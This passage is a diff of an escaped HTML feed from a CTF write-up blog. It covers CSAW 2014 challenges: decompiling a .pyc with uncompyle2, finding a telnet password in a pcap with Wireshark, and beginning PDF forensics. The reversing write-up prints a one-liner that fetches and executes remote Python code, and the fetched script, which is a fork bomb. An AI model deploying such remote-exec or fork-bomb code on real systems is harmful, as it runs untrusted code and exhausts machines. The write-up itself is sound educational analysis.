+  uncompyle2 -o /tmp /usr/lib/python1.5 &lt;span class="c"&gt;# decompile whole library&lt;/span&gt;
 
 Options:
   -o &amp;lt;path&amp;gt;     output decompiled files to this path:
-                &lt;span class="k"&gt;if&lt;/span&gt; multiple input files are decompiled, the common prefix
+                &lt;span class="k"&gt;if &lt;/span&gt;multiple input files are decompiled, the common prefix
                 is stripped from these names and the remainder appended to
                 &amp;lt;path&amp;gt;
                   uncompyle -o /tmp bla/fasel.pyc bla/foo.pyc
@@ -550,58 +535,50 @@ Options:
 
 
 &lt;p&gt;We could also use &lt;em&gt;.py&lt;/em&gt; extension if we like:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  --py          use &lt;span class="s1"&gt;&amp;#39;.py&amp;#39;&lt;/span&gt; extension &lt;span class="k"&gt;for&lt;/span&gt; generated files
+&lt;div class="highlight"&gt;&lt;pre&gt;  --py          use &lt;span class="s1"&gt;&amp;#39;.py&amp;#39;&lt;/span&gt; extension &lt;span class="k"&gt;for &lt;/span&gt;generated files
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Also, we learn about all the possible outputs:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; Extensions of generated files:
+&lt;div class="highlight"&gt;&lt;pre&gt; Extensions of generated files:
   &lt;span class="s1"&gt;&amp;#39;.pyc_dis&amp;#39;&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.pyo_dis&amp;#39;&lt;/span&gt;   successfully decompiled &lt;span class="o"&gt;(&lt;/span&gt;and verified &lt;span class="k"&gt;if&lt;/span&gt; --verify&lt;span class="o"&gt;)&lt;/span&gt;
   &lt;span class="s1"&gt;&amp;#39;.py&amp;#39;&lt;/span&gt;                   with --py option
     + &lt;span class="s1"&gt;&amp;#39;_unverified&amp;#39;&lt;/span&gt;       successfully decompile but --verify failed
-    + &lt;span class="s1"&gt;&amp;#39;_failed&amp;#39;&lt;/span&gt;           uncompyle failed &lt;span class="o"&gt;(&lt;/span&gt;contact author &lt;span class="k"&gt;for&lt;/span&gt; enhancement&lt;span class="o"&gt;)&lt;/span&gt;
+    + &lt;span class="s1"&gt;&amp;#39;_failed&amp;#39;&lt;/span&gt;           uncompyle failed &lt;span class="o"&gt;(&lt;/span&gt;contact author &lt;span class="k"&gt;for &lt;/span&gt;enhancement&lt;span class="o"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;All right, no more diverging. Let's play! We run the &lt;code&gt;uncompyle2&lt;/code&gt; command and obtain the following:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ uncompyle2 utils.pyc
-&lt;span class="c1"&gt;#Embedded file name: /Users/kchung/Desktop/CSAW Quals 2014/rev100/utils.py&lt;/span&gt;
-&lt;span class="nb"&gt;exec&lt;/span&gt; __import__&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;urllib2&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;.urlopen&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://kchung.co/lol.py&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;.read&lt;span class="o"&gt;()&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;uncompyle2 utils.pyc
+&lt;span class="c"&gt;#Embedded file name: /Users/kchung/Desktop/CSAW Quals 2014/rev100/utils.py&lt;/span&gt;
+&lt;span class="nb"&gt;exec &lt;/span&gt;__import__&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;urllib2&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;.urlopen&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://kchung.co/lol.py&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;.read&lt;span class="o"&gt;()&lt;/span&gt;
 +++ okay decompyling utils.pyc
-&lt;span class="c1"&gt;# decompiled 1 files: 1 okay, 0 failed, 0 verify failed&lt;/span&gt;
+&lt;span class="c"&gt;# decompiled 1 files: 1 okay, 0 failed, 0 verify failed&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h2&gt;Parsing the Result and Voilà&lt;/h2&gt;
 &lt;p&gt;So all that this file does is in this line:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;exec&lt;/span&gt; &lt;span class="nb"&gt;__import__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;urllib2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urlopen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://kchung.co/lol.py&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;exec&lt;/span&gt; &lt;span class="nb"&gt;__import__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;urllib2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urlopen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;http://kchung.co/lol.py&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;To understand this code, we need to know that Python's &lt;a href="https://docs.python.org/2/reference/simple_stmts.html#exec"&gt;exec&lt;/a&gt; method performs dynamic execution of code.  In this problem, &lt;em&gt;exec&lt;/em&gt; starts importing &lt;a href="https://docs.python.org/2/library/urllib2.html#module-urllib2"&gt;urllib2&lt;/a&gt;, which is a library for opening URLs.  It has the method &lt;a href="https://docs.python.org/2/library/urllib2.html#urllib2.urlopen"&gt;urlopen()&lt;/a&gt; to open the URL url, which can be either a string or a request object. This function returns a file-like object with three additional methods. Finally, &lt;a href="http://www.tutorialspoint.com/python/file_read.htm"&gt;read()&lt;/a&gt; would read this returned file.&lt;/p&gt;
 &lt;p&gt;So all that this script does is to try running a Python file that is hosted online!
 Well, let's see what this file does! Let's just &lt;em&gt;curl&lt;/em&gt; &lt;a href="http://kchung.co/lol.py"&gt;http://kchung.co/lol.py&lt;/a&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$  curl http://kchung.co/lol.py
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt; curl http://kchung.co/lol.py
 import os
-&lt;span class="k"&gt;while&lt;/span&gt; True:
+&lt;span class="k"&gt;while &lt;/span&gt;True:
     try:
         os.fork&lt;span class="o"&gt;()&lt;/span&gt;
     except:
         os.system&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;start&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
-&lt;span class="c1"&gt;# flag{trust_is_risky}&lt;/span&gt;
+&lt;span class="c"&gt;# flag{trust_is_risky}&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Yaaay! The flag is &lt;strong&gt;trust_is_risky&lt;/strong&gt;! Easy!&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Hack all the things!&lt;/strong&gt;&lt;/p&gt;</content><category term="CTF"></category><category term="CSAW"></category><category term="uncompyle2"></category></entry><entry><title>CSAW CTF 2014 - Networking 100: "Big Data"</title><link href="http://bt3gl.github.io/csaw-ctf-2014-networking-100-big-data.html" rel="alternate"></link><published>2014-09-22T08:20:00-04:00</published><updated>2014-09-22T08:20:00-04:00</updated><author><name>Marina von Steinkirch</name></author><id>tag:bt3gl.github.io,2014-09-22:/csaw-ctf-2014-networking-100-big-data.html</id><summary type="html">&lt;p&gt;This is the only networking problem, and it is only 100 points, so it turned out to be very easy.&lt;/p&gt;
-&lt;p&gt;The problem starts with the following text:&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;Something, something, data, something, something, big&lt;/p&gt;
-&lt;p&gt;Written by HockeyInJune&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://github.com/ctfs/write-ups/blob/master/csaw-ctf-2014/big-data/pcap.pcapng"&gt;pcap.pcapng&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h2&gt;Inspecting the Wireshark File&lt;/h2&gt;
-&lt;p&gt;The file extension &lt;a href="https://appliance.cloudshark.org/blog/5-reasons-to-move-to-pcapng/"&gt;.pcapng&lt;/a&gt; correspond to files for …&lt;/p&gt;</summary><content type="html">&lt;p&gt;This is the only networking problem, and it is only 100 points, so it turned out to be very easy.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Hack all the things!&lt;/strong&gt;&lt;/p&gt;</summary><category term="CTF"></category><category term="CSAW"></category><category term="uncompyle2"></category></entry><entry><title>CSAW CTF 2014 - Networking 100: "Big Data"</title><link href="http://bt3gl.github.io/csaw-ctf-2014-networking-100-big-data.html" rel="alternate"></link><updated>2014-09-22T08:20:00-04:00</updated><author><name>Mia von Steinkirch</name></author><id>tag:bt3gl.github.io,2014-09-22:csaw-ctf-2014-networking-100-big-data.html</id><summary type="html">&lt;p&gt;This is the only networking problem, and it is only 100 points, so it turned out to be very easy.&lt;/p&gt;
 &lt;p&gt;The problem starts with the following text:&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Something, something, data, something, something, big&lt;/p&gt;
@@ -611,137 +588,125 @@ import os
 &lt;h2&gt;Inspecting the Wireshark File&lt;/h2&gt;
 &lt;p&gt;The file extension &lt;a href="https://appliance.cloudshark.org/blog/5-reasons-to-move-to-pcapng/"&gt;.pcapng&lt;/a&gt; correspond to files for &lt;em&gt;packet capture&lt;/em&gt;. They usually contain a dump of data packets captured over a network. This type of files holds blocks or data, and they can be used to rebuild captured packets into recognizable data.&lt;/p&gt;
 &lt;p&gt;We can open this file with &lt;a href="https://www.wireshark.org/"&gt;Wireshark&lt;/a&gt;, which is an open-source packet analyzer, or using &lt;a href="http://chaosreader.sourceforge.net/"&gt;chaosreader&lt;/a&gt;, a freeware tool to trace TCP and UDP sessions. We choose the first. There are several things that we could explore and look for in this file:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    - We could search for all the the interesting protocols inside and analyze them.
+&lt;div class="highlight"&gt;&lt;pre&gt;    &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;We&lt;/span&gt; &lt;span class="n"&gt;could&lt;/span&gt; &lt;span class="n"&gt;search&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;all&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;interesting&lt;/span&gt; &lt;span class="n"&gt;protocols&lt;/span&gt; &lt;span class="n"&gt;inside&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;analyze&lt;/span&gt; &lt;span class="n"&gt;them&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
 
-    - We could go to *Statistics*-&amp;gt; *Protocol Hierarchy* and look at the traffic patterns.
+    &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;We&lt;/span&gt; &lt;span class="n"&gt;could&lt;/span&gt; &lt;span class="n"&gt;go&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;Statistics&lt;/span&gt;&lt;span class="o"&gt;*-&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;Protocol&lt;/span&gt; &lt;span class="n"&gt;Hierarchy&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;look&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;traffic&lt;/span&gt; &lt;span class="n"&gt;patterns&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
 
-    - We could search in packet bytes, looking for specific strings such as login or password.
+    &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;We&lt;/span&gt; &lt;span class="n"&gt;could&lt;/span&gt; &lt;span class="n"&gt;search&lt;/span&gt; &lt;span class="n"&gt;in&lt;/span&gt; &lt;span class="n"&gt;packet&lt;/span&gt; &lt;span class="n"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;looking&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;specific&lt;/span&gt; &lt;span class="n"&gt;strings&lt;/span&gt; &lt;span class="n"&gt;such&lt;/span&gt; &lt;span class="n"&gt;as&lt;/span&gt; &lt;span class="n"&gt;login&lt;/span&gt; &lt;span class="n"&gt;or&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
 
-    - We could try to find something interesting in *Conversations*.
+    &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;We&lt;/span&gt; &lt;span class="n"&gt;could&lt;/span&gt; &lt;span class="n"&gt;try&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;find&lt;/span&gt; &lt;span class="n"&gt;something&lt;/span&gt; &lt;span class="n"&gt;interesting&lt;/span&gt; &lt;span class="n"&gt;in&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;Conversations&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h2&gt;Searching for the String &lt;em&gt;Password&lt;/em&gt;&lt;/h2&gt;
 &lt;p&gt;It turned out that all we need was to look for the string &lt;em&gt;password&lt;/em&gt;. To do this we followed these steps in Wireshark:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;     1. Go to *Edit*
+&lt;div class="highlight"&gt;&lt;pre&gt;     &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="n"&gt;Go&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;Edit&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;
 
-     2. Go to *Find Packet*
+     &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="n"&gt;Go&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;Find&lt;/span&gt; &lt;span class="n"&gt;Packet&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;
 
-     3. Search for **password** choosing the options *string* and *packet bytes*.
+     &lt;span class="mf"&gt;3.&lt;/span&gt; &lt;span class="n"&gt;Search&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;choosing&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;options&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;packet&lt;/span&gt; &lt;span class="n"&gt;bytes&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Yay! We found something over a &lt;strong&gt;telnet&lt;/strong&gt; protocol:&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/mUN4b1n.png"&gt;&lt;/p&gt;
-&lt;hr&gt;
+&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/mUN4b1n.png" /&gt;&lt;/p&gt;
+&lt;hr /&gt;
 &lt;h2&gt;Following the TCP Stream&lt;/h2&gt;
 &lt;p&gt;Now, all we need to do is to right-click in the line and choose &lt;em&gt;Follow TCP Stream&lt;/em&gt;. This  returns:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;..... .....&amp;#39;...........%..&amp;amp;..... ..#..&amp;#39;..$..%..&amp;amp;..#..............$.. .....&amp;#39;.............P...... .38400,38400....&amp;#39;.......XTERM.......&amp;quot;.....!.....&amp;quot;.....!............
-Linux 3.13.0-32-generic (ubuntu) (pts/0)
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;.....&lt;/span&gt; &lt;span class="p"&gt;.....&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;...........&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="p"&gt;.....&lt;/span&gt; &lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="p"&gt;..............&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt; &lt;span class="p"&gt;.....&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;.............&lt;/span&gt;&lt;span class="n"&gt;P&lt;/span&gt;&lt;span class="p"&gt;......&lt;/span&gt; &lt;span class="mf"&gt;.38400&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mf"&gt;38400.&lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;.......&lt;/span&gt;&lt;span class="n"&gt;XTERM&lt;/span&gt;&lt;span class="p"&gt;.......&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;.....!.....&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;.....&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;............&lt;/span&gt;
+&lt;span class="n"&gt;Linux&lt;/span&gt; &lt;span class="mf"&gt;3.13.0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;generic&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ubuntu&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pts&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 
-..ubuntu login: j.ju.ul.li.ia.an.n
-.
-..Password: flag{bigdataisaproblemnotasolution}
-.
-.
-Login incorrect
-..ubuntu login:
+&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="n"&gt;ubuntu&lt;/span&gt; &lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ju&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ul&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;li&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ia&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;an&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;
+&lt;span class="p"&gt;.&lt;/span&gt;
+&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="n"&gt;Password&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;bigdataisaproblemnotasolution&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;.&lt;/span&gt;
+&lt;span class="p"&gt;.&lt;/span&gt;
+&lt;span class="n"&gt;Login&lt;/span&gt; &lt;span class="n"&gt;incorrect&lt;/span&gt;
+&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="n"&gt;ubuntu&lt;/span&gt; &lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;And we find our flag: &lt;strong&gt;bigdataisaproblemnotasolution&lt;/strong&gt;!&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Hack all the things!&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;Edited: If you had decided to use &lt;em&gt;chaosreader&lt;/em&gt; to process the pcapng file instead, the solution &lt;a href="http://evandrix.github.io/ctf/2014-csaw-networking-100-bigdata.html"&gt;from this write-up&lt;/a&gt; is also cool:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; f in pcap.pcapng-chaosreader/*.html&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; cat &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;f&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; w3m -dump -T text/html &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;f&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; egrep &lt;span class="s2"&gt;&amp;quot;flag{&amp;quot;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;</content><category term="CTF"></category><category term="CSAW"></category><category term="Wireshark"></category><category term="Chaosreader"></category></entry><entry><title>CSAW CTF 2014 - Forensics 200: "Obscurity"</title><link href="http://bt3gl.github.io/csaw-ctf-2014-forensics-200-obscurity.html" rel="alternate"></link><published>2014-09-22T07:20:00-04:00</published><updated>2014-09-22T07:20:00-04:00</updated><author><name>Marina von Steinkirch</name></author><id>tag:bt3gl.github.io,2014-09-22:/csaw-ctf-2014-forensics-200-obscurity.html</id><summary type="html">&lt;p&gt;The third forensics challenge starts with the following text:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;for &lt;/span&gt;f in pcap.pcapng-chaosreader/*.html; &lt;span class="k"&gt;do &lt;/span&gt;cat &lt;span class="s2"&gt;&amp;quot;${f}&amp;quot;&lt;/span&gt; | w3m -dump -T text/html &lt;span class="s2"&gt;&amp;quot;${f}&amp;quot;&lt;/span&gt;; &lt;span class="k"&gt;done&lt;/span&gt; | egrep &lt;span class="s2"&gt;&amp;quot;flag{&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;</summary><category term="CTF"></category><category term="CSAW"></category><category term="Wireshark"></category><category term="Chaosreader"></category></entry><entry><title>CSAW CTF 2014 - Forensics 200: "Obscurity"</title><link href="http://bt3gl.github.io/csaw-ctf-2014-forensics-200-obscurity.html" rel="alternate"></link><updated>2014-09-22T07:20:00-04:00</updated><author><name>Mia von Steinkirch</name></author><id>tag:bt3gl.github.io,2014-09-22:csaw-ctf-2014-forensics-200-obscurity.html</id><summary type="html">&lt;p&gt;The third forensics challenge starts with the following text:&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;see or do not see&lt;/p&gt;
 &lt;p&gt;Written by marc&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://ctf.isis.poly.edu/static/uploads/883c7046854e04138c55680ffde90a61/pdf.pdf"&gt;pdf.pdf&lt;/a&gt;
-&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://ctf.isis.poly.edu/static/uploads/883c7046854e04138c55680ffde90a61/pdf.pdf"&gt;pdf.pdf&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;Hacking PDFs, what fun!&lt;/p&gt;
 &lt;p&gt;In general, when dealing with reverse-engineering malicious documents, we follow these steps:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; 1. We search for malicious embedded code (shell code, JavaScript).
+&lt;div class="highlight"&gt;&lt;pre&gt; &lt;span class="mf"&gt;1.&lt;/span&gt; &lt;span class="n"&gt;We&lt;/span&gt; &lt;span class="n"&gt;search&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;malicious&lt;/span&gt; &lt;span class="n"&gt;embedded&lt;/span&gt; &lt;span class="n"&gt;code&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;shell&lt;/span&gt; &lt;span class="n"&gt;code&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;JavaScript&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
 
- 2. We extract any suspicious …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;The third forensics challenge starts with the following text:&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;see or do not see&lt;/p&gt;
-&lt;p&gt;Written by marc&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://ctf.isis.poly.edu/static/uploads/883c7046854e04138c55680ffde90a61/pdf.pdf"&gt;pdf.pdf&lt;/a&gt;
-&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;Hacking PDFs, what fun!&lt;/p&gt;
-&lt;p&gt;In general, when dealing with reverse-engineering malicious documents, we follow these steps:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; 1. We search for malicious embedded code (shell code, JavaScript).
+ &lt;span class="mf"&gt;2.&lt;/span&gt; &lt;span class="n"&gt;We&lt;/span&gt; &lt;span class="n"&gt;extract&lt;/span&gt; &lt;span class="n"&gt;any&lt;/span&gt; &lt;span class="n"&gt;suspicious&lt;/span&gt; &lt;span class="n"&gt;code&lt;/span&gt; &lt;span class="n"&gt;segments&lt;/span&gt;
 
- 2. We extract any suspicious code segments
-
- 3. If we see shell code, we disassemble or debug it. If we see JavaScript (or ActionScript or VB macro code), we try to examine it.
+ &lt;span class="mf"&gt;3.&lt;/span&gt; &lt;span class="n"&gt;If&lt;/span&gt; &lt;span class="n"&gt;we&lt;/span&gt; &lt;span class="n"&gt;see&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt; &lt;span class="n"&gt;code&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;we&lt;/span&gt; &lt;span class="n"&gt;disassemble&lt;/span&gt; &lt;span class="n"&gt;or&lt;/span&gt; &lt;span class="n"&gt;debug&lt;/span&gt; &lt;span class="n"&gt;it&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="n"&gt;If&lt;/span&gt; &lt;span class="n"&gt;we&lt;/span&gt; &lt;span class="n"&gt;see&lt;/span&gt; &lt;span class="n"&gt;JavaScript&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;or&lt;/span&gt; &lt;span class="n"&gt;ActionScript&lt;/span&gt; &lt;span class="n"&gt;or&lt;/span&gt; &lt;span 